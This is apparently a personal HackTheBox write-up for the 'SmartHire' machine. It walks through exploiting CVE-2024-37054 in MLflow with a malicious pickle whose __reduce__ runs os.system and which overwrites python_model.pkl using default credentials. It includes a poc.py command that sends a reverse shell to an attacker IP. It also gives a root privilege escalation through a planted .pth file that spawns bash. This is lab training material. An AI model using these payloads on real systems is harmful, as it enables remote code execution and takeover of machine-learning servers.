---
title: "SmartHire"
category: ["HTB", "Machines", "SmartHire"]
---

Note title: SmartHire

![Pasted image 20260520161223](/VaultSite/wiki-images/Pasted%20image%2020260520161223.png)


![Pasted image 20260520161334](/VaultSite/wiki-images/Pasted%20image%2020260520161334.png)

Add it in /etc/hosts

![Pasted image 20260520161428](/VaultSite/wiki-images/Pasted%20image%2020260520161428.png)

![Pasted image 20260520161530](/VaultSite/wiki-images/Pasted%20image%2020260520161530.png)
![Pasted image 20260520161606](/VaultSite/wiki-images/Pasted%20image%2020260520161606.png)
![Pasted image 20260520161640](/VaultSite/wiki-images/Pasted%20image%2020260520161640.png)

![Pasted image 20260520170217](/VaultSite/wiki-images/Pasted%20image%2020260520170217.png)
![Pasted image 20260520170537](/VaultSite/wiki-images/Pasted%20image%2020260520170537.png)


![Pasted image 20260520170438](/VaultSite/wiki-images/Pasted%20image%2020260520170438.png)

![Pasted image 20260520170636](/VaultSite/wiki-images/Pasted%20image%2020260520170636.png)

admin password Default creds 


![Pasted image 20260520174756](/VaultSite/wiki-images/Pasted%20image%2020260520174756.png)



https://github.com/ben-slates/CVE-2024-37054/tree/main

## Explanation of CVE-2024-37054 Exploit - MLflow Pickle RCE

### **What is the vulnerability?**

MLflow deserializes pickle files (`python_model.pkl`) **without validating their content**. Pickles can contain malicious code that executes automatically upon deserialization.

---

### **The attack in 6 steps:**

#### **STEP 1: Authentication (optional)**

python

```python
def login(self) -> bool:
    # Si tienes credenciales de la app, inicia sesión
    # Esto obtiene una cookie de sesión válida
```

Note title: SmartHire

- If the app requires login, it authenticates
- Stores the cookie in `self.session.cookies`

---

#### **STEP 2: Create the malicious payload**

python

```python
def create_payload(self) -> bytes:
    class PickleRCE:
        def __reduce__(self):
            # Ejecuta comando cuando pickle.load() lo deserializa
            return (os.system, (cmd,))
    
    return pickle.dumps(PickleRCE())
```

**How does it work?**

- `__reduce__()` is a special method in Python
- When `pickle.loads()` or `pickle.load()` deserializes the object, **it automatically executes the command**
- `os.system` executes shell commands

**Example:**

python

```python
# Esto crea un pickle que ejecuta:
# python3 -c 'import socket...reverse shell...'

# Cuando se deserializa, ¡ejecuta la reverse shell automáticamente!
```

#### **STEP 3: Upload Training Data**

python

```python
def upload_training_data(self) -> bool:
    train_csv = b"name,skills,experience,education..."
    
    response = self.session.post(
        "/upload_hiring_data",  # El endpoint que vimos
        files={"file": ("train.csv", train_csv)}
    )
```

Note title: SmartHire

**What happens?**

1. Upload a legitimate CSV
2. Backend processes the CSV
3. **MLflow registers a new model** in the Tracking Server
4. Backend responds with the `run_id` (unique training ID)

---

#### **STEP 4: Get the run_id**

python

```python
def get_run_id(self) -> Optional[str]:
    # Consulta la API de MLflow
    response = requests.post(
        "http://mlflow.local/api/2.0/mlflow/runs/search",
        json={"experiment_ids": ["0"], "max_results": 1},
        auth=("admin", "password")  # Credenciales MLflow
    )
    
    # Obtiene el ID del último run
    run_id = response.json()["runs"][0]["info"]["run_id"]
    return run_id
```

Note title: SmartHire

**What does it do?**

- Queries the public MLflow API (sometimes without authentication)
- Retrieves information about the latest trained model
- Extracts the `run_id` (e.g., `abc123def456`)

---

#### **STEP 5: Overwrite python_model.pkl**

python

```python
def upload_payload(self, run_id: str, payload: bytes) -> bool:
    url = f"http://mlflow.local/api/2.0/mlflow-artifacts/artifacts/0/{run_id}/artifacts/model/python_model.pkl"
    
    response = requests.put(
        url,
        data=payload,  # ← El pickle malicioso
        auth=("admin", "password")
    )
```

# SmartHire

**What's happening?**

1. Accesses the `python_model.pkl` file of the registered model
2. **REPLACES IT WITH THE MALICIOUS PICKLE**
3. Now the model contains the malicious code

**Structure:**

```
MLflow Artifacts:
  └─ 0/  (experiment)
    └─ abc123def456/  (run_id)
      └─ artifacts/
        └─ model/
          └─ python_model.pkl  ← ¡AQUÍ SE PONE EL MALICIOSO!
```

#### **STEP 6: RCE Trigger (Deserialization)**

python

```python
def trigger_rce(self) -> bool:
    # Sube un CSV para hacer predicción
    response = self.session.post(
        "/predict",  # El endpoint "Make Predictions"
        files={"file": ("pred.csv", pred_csv)}
    )
```

**What happens?**

1. App receives `/predict` request
2. Needs to load the trained model
3. Reads the `python_model.pkl` file (now malicious)
4. **Executes `pickle.load(open("python_model.pkl"))`**
5. **RCE!!!** 🎉 Command is executed

---

### **Visual summary of the attack:**

```
┌─────────────────────────────────────────────────────────┐
│  PASO 1: Login                                           │
│  Autentica en la app (obtiene session cookie)            │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│  PASO 2: Crear pickle malicioso                          │
│  PickleRCE.__reduce__() → os.system("reverse shell")     │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│  PASO 3: Upload CSV legítimo                             │
│  POST /upload_hiring_data → Backend entrena modelo      │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│  PASO 4: Obtener run_id                                  │
│  Query MLflow API → Obtiene ID del modelo registrado     │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│  PASO 5: Reemplazar python_model.pkl                     │
│  PUT /artifacts/{run_id}/python_model.pkl ← MALICIOSO   │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│  PASO 6: Trigger RCE                                     │
│  POST /predict → Carga modelo → pickle.load() → RCE! ✓  │
└─────────────────────────────────────────────────────────┘
```

Note title: SmartHire

---

### **Why Does It Work?**

**MLflow is vulnerable because:**

1. It uses `pickle.load()` without validation
2. Pickles are serialized Python code
3. `__reduce__()` executes **automatically** during deserialization
4. The attacker can overwrite model files

**Malicious pickle example:**

python

```python
import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ("whoami > /tmp/pwned.txt",))

# Cuando haces: pickle.load(file_con_esto)
# ¡¡¡ Se ejecuta whoami > /tmp/pwned.txt !!!
```

Note title: SmartHire

---

### **In your HTB case:**

You would use it like this:


```bash
python3 poc.py \
    http://smarthire.htb \
    http://models.smarthire.htb \
    10.10.15.215 \
    4444 \
    --mlflow-creds admin:password \
    --app-username user \
    --app-password pass
```



Note title: SmartHire

![Pasted image 20260520180243](/VaultSite/wiki-images/Pasted%20image%2020260520180243.png)
![Pasted image 20260520180619](/VaultSite/wiki-images/Pasted%20image%2020260520180619.png)


![Pasted image 20260520182327](/VaultSite/wiki-images/Pasted%20image%2020260520182327.png)


#### 2. Create the auto-loading `.pth` file

Run this exact command. It will create a file called `exploit.pth` inside the `dev` folder where you do have permissions:


```
echo 'import os, pty; os.setuid(0); os.setgid(0); pty.spawn("/bin/bash")' > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth
```

Note title: SmartHire

_Why does this work?_ As soon as the main script loops through the plugin folders and calls `site.addsitedir('/opt/tools/mlflow_ctl/plugins/dev')`, the Python interpreter will read this `.pth` file and immediately execute the shell injection, bypassing the time-based `if/else` blocks and `core` priorities.

- **With a `.py` file:** You have to wait for the program flow to reach the `import` line and for Python to decide your folder takes priority over others. Since `core` was first, you lost the race.
    
- **With a `.pth` file:** Your code executes **in second 1**, right when the main script is setting up folders at the very beginning, long before checking if 10 minutes have passed since the last backup, and long before deciding which `backup_models` module to import.

Why the method described in [[Python Library Hijacking]] doesn't work and this one is more complicated:
### Your Proposal (Hijacking in Current Directory)

- **The idea:** Seeing that `sys.path` starts with an empty string (`''`), you correctly deduce that Python first searches for libraries in the directory where you execute the command (e.g., `/tmp`).
    ![Pasted image 20260520184007](/VaultSite/wiki-images/Pasted%20image%2020260520184007.png)
- **The plan:** Create a fake file named `pathlib.py` in `/tmp` with malicious code and execute the command with `sudo`.

### Why It Would NOT Work (The 2 Technical Reasons)

1. **The `sudo` restriction:** For security, when you prepend `sudo`, the operating system cleans environment variables and restricts relative paths. In many configurations, Python ignores the current directory (`''`) if it detects elevated privileges, precisely to prevent an unprivileged user from controlling the execution of a root binary.
    
2. **The Broken "Puzzle" (`AttributeError`):** The original script imports `pathlib` in the very first line and immediately uses its `Path` class to calculate paths (`BASE_DIR = Path(__file__)...`). If Python loaded your modified `pathlib.py`, it wouldn't have the legitimate methods the script needs to continue running. The program would throw a runtime error and crash immediately **before** giving you the shell.

![Pasted image 20260520184625](/VaultSite/wiki-images/Pasted%20image%2020260520184625.png)
We see it doesn't even interpret the library. 